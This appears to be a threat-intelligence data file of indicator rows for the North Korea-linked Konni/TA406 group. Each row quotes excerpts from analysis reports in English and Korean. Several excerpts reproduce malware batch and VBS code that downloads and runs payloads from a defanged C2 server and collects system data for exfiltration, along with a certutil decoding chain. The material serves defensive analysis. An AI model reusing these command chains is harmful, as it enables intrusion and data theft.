attachment masquerading as a preview of an article, as shown in Figure 33. Figure 33. Phishing message with HTML attachment 30 TRIPLE THREAT",
1.0.0,actor--konni,artifact--sha256:c6b6ec2f71ac994c509dcaa876851ea298f35b23c0187a4bdf2a01568541c246,observation--sha256:2301b756464ad3493e100b1da9ed49e7531e6067d006eb3f73397b3dcb86a044,file-name,FatBoy32.dll,FatBoy32.dll,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Command Purpose cd /d %USERPROFILE% Set current directory to %USERPROFILE% findstr /b “TVNDR” “[path from ActiveDocument.FullName]”>xtong.txt Use findstr to parse the Word document looking for the string “TVNDR” that follows a new line and then writes all following data to xtong.txt certutil -decode -f xtong.txt xto.c Use certutil to Base64 decode the data in xtong.txt and save to xto.c, which resulted in a CAB file being saved to xto.c expand -f:* xto.c %USERPROFILE% Use the expand command to e",
1.0.0,actor--konni,artifact--sha256:dba76921e31118100989f0e86f368a7abdeed1d3b6f1860d53360740bade9c80,observation--sha256:dec6d1cdfbb09c46ab112a94b2862ba4eb36567bb733ffb30e7573b9ba6e5da5,file-name,FatBoy64.dll,FatBoy64.dll,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Command Purpose cd /d %USERPROFILE% Set current directory to %USERPROFILE% findstr /b “TVNDR” “[path from ActiveDocument.FullName]”>xtong.txt Use findstr to parse the Word document looking for the string “TVNDR” that follows a new line and then writes all following data to xtong.txt certutil -decode -f xtong.txt xto.c Use certutil to Base64 decode the data in xtong.txt and save to xto.c, which resulted in a CAB file being saved to xto.c expand -f:* xto.c %USERPROFILE% Use the expand command to e",
1.0.0,actor--konni,artifact--sha256:d72c7d446002ff511a18f8903a30de27ad6a0cee189a68edcb855c8bb4c9e8dc,observation--sha256:7400fafaf2f9d349e6f28468186498f420fe8dbb85395f75d66708ff31b2e823,file-name,Hwp.exe,Hwp.exe,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 36 04. 유사도 분석 (Similarity) a. APT37 LNK 공격과 Konni LNK 공격 구조비교 ○ 2023 년 상반기 발견된 APT37 과 Konni 캠페인의 LNK 악성 코드를 비교하면 서로 다른 패턴을 가지고 있음을 알 수 있습니다. Konni 경우 Base64 인코딩을 사용합니다. APT37 LNK (MD5 : 1b046ab2261bc0dc5c6cd999f9a8b1c6) Konni LNK (MD5 : 0db38e75740572fed8179d67c33019cb) /c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath = '%temp%'}; $lnkpath = Get-ChildItem -Pa,
1.0.0,actor--konni,artifact--sha256:98d5e37ca7e917e572333fee3bbd05354da9b758371076d76d45247e3bb6b18e,observation--sha256:ec247c5979d9b50e14122b6dbeaff9929a34fe3dfdf45379721d5502a7f6df6b,file-name,Jauur0.hta,Jauur0.hta,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Another observation regarding Star is the use of a URL path and comments to a hostname with no TLD: hxxp[:]//star/mail/u/0/. This may have been a device name the developer(s) used during the development or testing phase. A similar observation was made in some of the oldest known samples associated with BabyShark , where the following URL was used: hxxp[:]//ksi/000/spy/Jauur0.hta (see Figure 15). Figure 15. ksi hostname observed in VBS from BabyShark related document The ksi pattern, shown in Fig",
1.0.0,actor--konni,artifact--sha256:5e70726623f5df8f2aea3dabe2ce889ae3143f1b85ca93d22a5717f57fd47820,observation--sha256:b81e7fd71b49218d2ac44f0374ff1612031f1ddca78556b7c5938e9ef604af72,file-name,Obfuscatedinstall.vbs,Obfuscatedinstall.vbs,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain Technical Analysis Initial Compression Theattackchainbeginswiththedownloadof anISOimagefromanITWURL. ThisISOimagesubsequentlydeploysanother zipfile, whichcontainsmaliciousscripts. Figure2- Zipfilecontainslotsof scripts install.vbs Theinstall.vbsscript isheavilyobfuscatedusingXORandvariousother techniques. Figure3- Obfuscatedinstall.vbs Thedeobfuscatedversionof theVBScript isquitestraightforward; it merelyexecutesanother batchscri",
1.0.0,actor--konni,artifact--sha256:b716984fb05a4da8c90d245e2712f98f2d92c65f00606668ff2215a3fc896eec,observation--sha256:2924feb55874c125119968da12f6a0602ba68aa0453a94246ba65b18b3671eaf,file-name,Obfuscatedupdate.vbs,Obfuscatedupdate.vbs,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain update.vbs The'update.vbs' closelyresembles'install.vbs,' employingthesameobfuscationtechniquesandperformingidentical tasks. Figure5- Obfuscatedupdate.vbs However, itsdistinctivefeatureisthat it executesascript named'stopedge.bat'. Figure6- Deobfuscatedupdate.vbs 7",
1.0.0,actor--konni,artifact--sha256:2640a1f7152c8f4227072ef3022054d8fa5dfc2724bdb0a1e6bddcd359ada1a9,observation--sha256:357801075af0c2bcdf543495b5f1a22e57a2d250f3ac1099dde87f8bdb360eb9,file-name,PDF.js,PDF.js,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Throughout 2020 and 2021, TA406 has used a landing page that loads a PDF in the browser along with a box to collect credentials (see Figures 25 and 26). Figure 25. PDF.js reader with Russian language login prompt Figure 26. PDF.js reader with an English language login prompt 25 TRIPLE THREAT: NORTH KOREA-ALIGNED TA406 STEALS, SCAMS, AND SPIES \ REPORT",
1.0.0,actor--konni,artifact--sha256:b23d0eaa7c63f7308eaf94a4979ceb232c18dfc69bec819253ee00e6ae4ae3bd,observation--sha256:af1e445b0d10ab95924b392ae67a6974825b42a897eeb030bf937ef5f72aab00,file-name,Unactive.vbs,Unactive.vbs,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain unactivate.vbs Unliketheother scripts, 'Unactive.vbs' isamoreextensiveone. Yet, whenitsobfuscatedcodeisunraveled, it becomesapparent that it hasthepotential for exfiltration. Thisisachievedthroughtheexecutionof aPOSTrequest, incorporating'name' and'data' fields. Figure9- Obfuscatedformof unactivate.vbs Figure10- Deobfuscatedformof unactivate.vbs 9",
1.0.0,actor--konni,artifact--sha256:1f1757b275b9578f517b049ad86b488d9fc249e36e9ee78d86d55a68575679df,observation--sha256:12a9f7943f7e20c19ef4e1be539b644d57532dd91bfaf734856242320b06d683,file-name,WScript.exe,WScript.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○사용자정보를모으기위해DIR명령을통해주요경로의디렉토리구성과파일정보,공인 아이피 주소 및 프로세스 리스트, 시스템 정보 등을 텍스트 파일(. data) 로저장합니다. 파일명 내용 cuserdown.data Downloads 경로의디렉토리구조와파일정보 cuserdocu.data documents 경로의디렉토리구조와파일정보 cuserdesk.data desktop경로의디렉토리구조와파일정보 cprog.data ProgramFiles 경로의디렉토리구조와파일정보 cprog32.data ProgramFiles (x86) 경로의디렉토리구조와파일정보 ipinfo.data 공인아이피주소 tsklt.data 실행프로세스정보 systeminfo.data OS종류, 모델, 바이오스버전등주요시스템정보[표4-7] 외부로유출시도되는파일및내용 ○ 사용자 정보 수집 명령이 진행된후약5초간시간지연이됩니다. 그다음수집된개인정보가전송될C2서버( anrun[.]kr) 를환경변",
1.0.0,actor--konni,artifact--sha256:1f1757b275b9578f517b049ad86b488d9fc249e36e9ee78d86d55a68575679df,observation--sha256:98e3ff58094ca5973155c54398dcb3b54b87b6d5565e82bed3ae0eeea872af5e,file-name,WScript.exe,WScript.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'resolvedns.bat' 파일코드분석 ○'resolvedns.bat' 파일은앞서작업스케줄러에등록된'install.vbs' 파일이실행될경우호출이됩니다. @echooff pushd""%~dp0"" set ttn=324093set tty=230704seturl=http://anrun[.]kr/movie/contents.php?fifo=%COMPUTERNAME% if exist ""stopedge.bat"" (del /f /qstopedge.bat)if exist ""%ttn%.zip"" (del /f /q%ttn%.zip)WScript.exeactivate.vbs ""%url%"" ""%ttn%.zip"" if exist ""%ttn%.zip"" (call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nulWScript.exe""%tty%.vbs""del /f /q%tty%.vbs >nul) [",
1.0.0,actor--konni,artifact--sha256:d4e458440147d3889f3c75569317bdea4564f4f2f9d2b07edb84b3b2b9783ed0,observation--sha256:6efb232a63ce6e2a21f60d96bdbd786f70fe4338d2b04895d3925ee3c87a8e87,file-name,WScript.exeunactivate.vbs,WScript.exeunactivate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'versioninfo.bat' 파일코드분석 ○'versioninfo.bat' 파일은'stopedge.bat' 파일에의해호출되는배치명령입니다.본 파일은 피해자 컴퓨터의주요정보를수집해탈취시도하는정찰기능을수행하게됩니다. @echooffpushd""%~dp0""dir C:\Users\%username%\downloads\/s >%~dp0cuserdown.datadir C:\Users\%username%\documents\/s >%~dp0cuserdocu.datadir C:\Users\%username%\desktop\/s >%~dp0cuserdesk.datadir ""C:\ProgramFiles\"" >%~dp0cprog.datadir ""C:\ProgramFiles (x86)\"" >%~dp0cprog32.datanslookupmyip.opendns.comresolver1.opendns.com>%~dp0ipinfo.datatasklist >%~dp0",
1.0.0,actor--konni,artifact--sha256:33a50ea32d081ce1d95f3bcfcc76b070f932da530aafe2397b27f76c87fb9e30,observation--sha256:94d6d4458fa85b54d1ee66a036e62a3f0b156ff85bbd9449cd83ac6bf49175d1,file-name,activate.bat,activate.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport install.vbs 1,652바이트 resolvedns.bat 호출 db31a36e1684c568fa3529d60a59ba29 versioninfo.bat 1,143바이트 시스템정보수집및anrun[.]kr 서버로유출시도 168bcc063501d191d82aaa3a32741a12 unactivate.vbs 6,644바이트 XMLHTTPPOSTContent-Typeform명령어 6b944c9dc4b760fffb56adf4fecf6764 resolvedns.bat 432바이트 anrun[.]kr 서버에서324093.zip다운로드및실행시도 892bd45372876d29e883e114981e311b activate.bat 2,331바이트 XMLHTTPGETAdodb.Stream명령어 b86c38ae5c24c55831d7f8ca3cbeb814 unzip.exe 167,936바이트 Unzip5.52압축해제정상유틸리티 75375c22c72f1beb7",
1.0.0,actor--konni,artifact--sha256:22cde33e1a0100a69ae75177cad789eba85fa2fd661346c523c2bd80e5d523ca,observation--sha256:dc06a0d63cb3d1df370d81ff0f70ba663be22b1071e8442d586624596093ebc1,file-name,activate.vbs,activate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림4-2] 'install.vbs' XOR연산부분을ASCII 문자로치환한화면 ○ 27개의 연산 항목을 문자열로 변경하면 다음과 같이 Windows Script Host(WScript.Shell) 를사용하여'resolvedns.bat' 배치파일을호출하여실행하는것을알수있습니다. ■'activate.vbs' 파일코드분석 ○'activate.vbs' 파일은'resolvedns.bat' 파일에의해호출되는스크립트입니다. 해당스크립트는C2 서버( anrun[.]kr) 에서지정된컴퓨터명(% COMPUTERNAME%) 으로별도 조건에 따라 연결되며, 지정된 환경변수명( ttn) 과 zip 확장자가 결합된'324093.zip' 파일을다운로드하는데사용됩니다. OnError ResumeNext Genians SecurityCenter 21",
1.0.0,actor--konni,artifact--sha256:22cde33e1a0100a69ae75177cad789eba85fa2fd661346c523c2bd80e5d523ca,observation--sha256:aa5b336e83245a01105fb87f5cb0d383d6459184541f09225eae8e53dab53267,file-name,activate.vbs,activate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 58020):WYN6h1=WYN6h1&Chr(42945Xor 42898):WYN6h1=WYN6h1&Chr(25557Xor 25505):WYN6h1=WYN6h1&Chr(59138Xor 59248)WYN6h1=WYN6h1&Chr(5123Xor 5222):WYN6h1=WYN6h1&Chr(65146Xor 65051):WYN6h1=WYN6h1&Chr(11416Xor11509):AdmvHxqfShikw=WYN6h1 Set ulaqHb7any=CreateObject(AdmvHxqfShikw)withulaqHb7any.type=1.open.writeSwjmwpj1ejHmVN5.responseBody.savetofileq_VGpmrB, 1EndwithEndIf [표4-3] 'activate.vbs' 파일스크립트명령어화면 ○ 'activate.vbs' 파일 역시 기존과 동일한 패턴으로 주요 문자열이 10진수와 XOR연산로직으로난독화되어있습니다. Genia",
1.0.0,actor--konni,artifact--sha256:22cde33e1a0100a69ae75177cad789eba85fa2fd661346c523c2bd80e5d523ca,observation--sha256:aaf39a86fe5fad777c705240d075999c3879c2a31794e8f40bad2605ee5fc36a,file-name,activate.vbs,activate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport [그림4-3] 'activate.vbs' XOR연산부분을ASCII 문자로치환한화면 Genians SecurityCenter 24,
1.0.0,actor--konni,artifact--sha256:22cde33e1a0100a69ae75177cad789eba85fa2fd661346c523c2bd80e5d523ca,observation--sha256:33d7e9dd88ac6af9852e4726cb5e5a4cbe2f815ff657dd701eaf5bff73b7f50f,file-name,activate.vbs,activate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'resolvedns.bat' 파일코드분석 ○'resolvedns.bat' 파일은앞서작업스케줄러에등록된'install.vbs' 파일이실행될경우호출이됩니다. @echooff pushd""%~dp0"" set ttn=324093set tty=230704seturl=http://anrun[.]kr/movie/contents.php?fifo=%COMPUTERNAME% if exist ""stopedge.bat"" (del /f /qstopedge.bat)if exist ""%ttn%.zip"" (del /f /q%ttn%.zip)WScript.exeactivate.vbs ""%url%"" ""%ttn%.zip"" if exist ""%ttn%.zip"" (call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nulWScript.exe""%tty%.vbs""del /f /q%tty%.vbs >nul) [",
1.0.0,actor--konni,artifact--sha256:22cde33e1a0100a69ae75177cad789eba85fa2fd661346c523c2bd80e5d523ca,observation--sha256:f606b21bce9203f82b3fe9f818bbd2e373f8bd5706442c90b5496880ab267932,file-name,activate.vbs,activate.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:22cde33e1a0100a69ae75177cad789eba85fa2fd661346c523c2bd80e5d523ca,observation--sha256:80550e6d80c5eddf11ea1408152613711897aed3d562fc90d3d9992860b3d471,file-name,activate.vbs,activate.vbs,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain stopedge.bat If afilenamed""paycom.ini"" existsinthestopedge.bat’sdirectory, it schedulesatasktorun""install.vbs"" every33minutes, deletes""paycom.ini,"" calls""versioninfo.bat,"" waitsfor 5seconds, andthendeletes""versioninfo.bat"" and""update.vbs."" Figure11- Persistencymechanismwithscheduledtasks resolvedns.bat Thebatchscript 'resolvedns.bat' utilizes'activate.vbs' toinitiatethedownloadof afilefromtheC2server. Figure12- Dnsresolutionandge",
1.0.0,actor--konni,artifact--sha256:22cde33e1a0100a69ae75177cad789eba85fa2fd661346c523c2bd80e5d523ca,observation--sha256:0d028f1bfb3f75b9a4cc3b3308be12230cfb8c6c40d980410ed1ad163e63780b,file-name,activate.vbs,activate.vbs,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain activate.vbs The'active.vbs' script utilizescommandlineargumentstoexecuteitstasks. It sendsanHTTPrequest andsavestheretrievedcontent."" Figure7- Obfuscatedformof activate.vbs Figure8- Deobfuscatedformof activate.vbs 8",
1.0.0,actor--konni,artifact--sha256:26f4e44efa78a58fad722c458c7d66d51034d038c704378cd9361a3bfb2fb493,observation--sha256:e981e18daf935f36d1c7989a99b9d4c8952becd8244088add40a8c956634aff6,file-name,active.vbs,active.vbs,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain activate.vbs The'active.vbs' script utilizescommandlineargumentstoexecuteitstasks. It sendsanHTTPrequest andsavestheretrievedcontent."" Figure7- Obfuscatedformof activate.vbs Figure8- Deobfuscatedformof activate.vbs 8",
1.0.0,actor--konni,artifact--sha256:04f7f770adcd0886f31cb8dd872708d97fa21e1f3dfe63cceb09b01bec52e25b,observation--sha256:cc849d50eefabbb3d63eef930546059e9c7b82e1241658ae86f6f01fadd96584,file-name,ball.bat,ball.bat,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"FatBoy analysis Like other TA406 first-stage implants, the FatBoy malware is a relatively small downloader at just 53KB in size with a very large overlay made up of all null bytes (85.8MB). When executed, FatBoy searches for a file in its host directory with its same file name but a .dtd extension—in this case, FatBoy.dtd . This file is used to store the C&C URL and likely employed as an anti- analysis technique. This is a common tactic used by TA406, where C&C information isn’t stored directly ",
1.0.0,actor--konni,artifact--sha256:19e7c4817d27308fe0a7e1714142dabe5f61dd1f512a3f8be598166e7fcdac6c,observation--sha256:c58d3def2facd43a751bf82639ca1a98cefd3bfdd857f8093e9aea9ce1324412,file-name,chk.bat,chk.bat,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Command Purpose cd /d %USERPROFILE% Set current directory to %USERPROFILE% findstr /b “TVNDR” “[path from ActiveDocument.FullName]”>xtong.txt Use findstr to parse the Word document looking for the string “TVNDR” that follows a new line and then writes all following data to xtong.txt certutil -decode -f xtong.txt xto.c Use certutil to Base64 decode the data in xtong.txt and save to xto.c, which resulted in a CAB file being saved to xto.c expand -f:* xto.c %USERPROFILE% Use the expand command to e",
1.0.0,actor--konni,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:35c45a1f12387e09c3d1de8ff278f1613bb3b57b6e996284d8e08595cadb788b,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 12 03. 위협 분석 (Threat Analysis) a. ‘소명자료 목록(국세징수법 시행규칙).hwp.lnk’ ○ ‘소명자료 목록(국세징수법 시행규칙).hwp.lnk’ 파일은 전형적인 LNK 유형의 악성 명령을 담고 있습니다. 우선 LNK 속성 정보 중 ‘대상’ 경로 앞단에 ‘%windir%\system32\cmd.exe’ 명령과 함께 별도의 인자가 실행되도록 구성되지만 화면상에 보이지는 않습니다. 그리고 ‘설명' 부분에는 마치 문서처럼 ‘hwp file’ 문구를 삽입한 것도 특징입니다. [그림 07] LNK 속성 정보 화면,
1.0.0,actor--konni,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:08d80d297c4a16748e81216dec1cdfe43419c4fcb8841cbd2bce1a5644af10fb,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 13 ○ LNK Parser 5 도구를 통해 내부 환경변수 위치에 선언된 ‘cmd.exe’ 명령과 인자값으로 사용된 Powershell 코드를 자세히 파악할 수 있습니다. [그림 08] LNK 내부 데이터 추출 화면 5 LNK Parser,
1.0.0,actor--konni,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:894563fe4069f303a94d4a5969b3c59227ab7af62461d9abd1420eed3ba737e8,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 21 ○ LNK 내부에 포함돼 있던 cmd.exe 파일에 의해 악성 코드가 실행된 공격 스토리라인을 EDR 분석을 통해 자세히 살펴볼 수 있고, 이를 통해 신속한 위협 헌팅이 가능합니다. [그림 11] LNK 내부에 포함돼 있던 cmd.exe 에 의해 실행된 공격 스토리라인 [그림 12] LNK 내부에 포함된 cmd.exe 에 의해 실행된 이벤트의 타임라인",
1.0.0,actor--konni,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:34f58cca415fda226e170af8a9b5f7471a34b3a0540e1ecd05e09598b6631e09,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○ 일반 조건의 윈도( Windows) 운영체제 환경에서 LNK 확장자는 생략되기 때문에보여지지 않지만, 조건 및 설정에 따라 확인이 가능합니다. 더불어 아이콘에 작은화살표가포함된것을통해파악할수있습니다. ○악성LNK 파일의경우보통속성의바로가기대상설정을통해'cmd.exe' 파일과Powershell 명령을조합해사용합니다. 하지만대상정보가자세히보기어려운경우가있습니다. 이때'LECmd' 도구를통해편리하게내부명령을파싱할수있습니다. 4 [그림3-1] LECmd도구로LNK명령어라인을추출한화면 ○추출한데이터값은다음과같이Powershell 명령을통해LNK내부에삽입된정상엑셀문서와악성압축파일을생성하고실행합니다. 4 EricZimmerman’s LECmd Genians SecurityCenter 9",
1.0.0,actor--konni,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:fe22012b5f1ba4df234d4df3445239295f1dcf3c26f3b9c288e415ad9165138b,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport ○본악성LNK파일의경우도동일하게바로가기대상설정을통해'cmd.exe' 파일과Powershell 명령을 조합해 사용합니다. 'LECmd' 도구를 통해 편리하게 내부명령을파싱할수있습니다. [그림3-4] LECmd도구로LNK명령어라인을추출한화면 ○추출한데이터값은다음과같이Powershell 명령을통해LNK내부에삽입된정상PDF문서와악성압축파일을생성하고실행합니다. Genians SecurityCenter 15,
1.0.0,actor--konni,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:23e6c0078a80b12bcc39d078efd36b177ba5e04da61d0c7aff6389ec848516fe,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The initial dropper, named mt4managre.exe, used a PDB path of: E:\Work\_Spyware\VIRUS_2020\Release\Dropper_exe_ media.pdb. The dropper can have a variable number of embedded payloads, which is defined by the last four bytes (DWORD) of the file (Figure 44). Figure 44. YoreKey dropper encoded config and number of payloads This value is then multiplied by 76 to find the size of the config. The config precedes the last four bytes of the file. This particular dropper only had two embedded payloads, s",
1.0.0,actor--konni,artifact--sha256:6f91413f6ecdc28645cd1a37fdeefa6158f77cf2f3d90f3f2f8a171509fc092b,observation--sha256:7d0cc0aac6fa6e7c92398a9f9deeaac7fefbd90a7a00d4060b943192ad86c0b1,file-name,config.php,config.php,candidate,,unknown,unknown,not-stated,,source--konni--e22c456560b2d889,konni/bluesky.txt,"{""line"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,"include( ""cfg/config.php"" );",
1.0.0,actor--konni,artifact--sha256:2b8c151a03d9ba7acfe985b621e289a1bf82ac5c0d35d0ec63d1ddb28b0df9d5,observation--sha256:5b37cb96ec2400da1713a9734a36e049559d15b5ec9356e9fbb4892b4dd32b1c,file-name,contents.php,contents.php,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'versioninfo.bat' 파일코드분석 ○'versioninfo.bat' 파일은'stopedge.bat' 파일에의해호출되는배치명령입니다.본 파일은 피해자 컴퓨터의주요정보를수집해탈취시도하는정찰기능을수행하게됩니다. @echooffpushd""%~dp0""dir C:\Users\%username%\downloads\/s >%~dp0cuserdown.datadir C:\Users\%username%\documents\/s >%~dp0cuserdocu.datadir C:\Users\%username%\desktop\/s >%~dp0cuserdesk.datadir ""C:\ProgramFiles\"" >%~dp0cprog.datadir ""C:\ProgramFiles (x86)\"" >%~dp0cprog32.datanslookupmyip.opendns.comresolver1.opendns.com>%~dp0ipinfo.datatasklist >%~dp0",
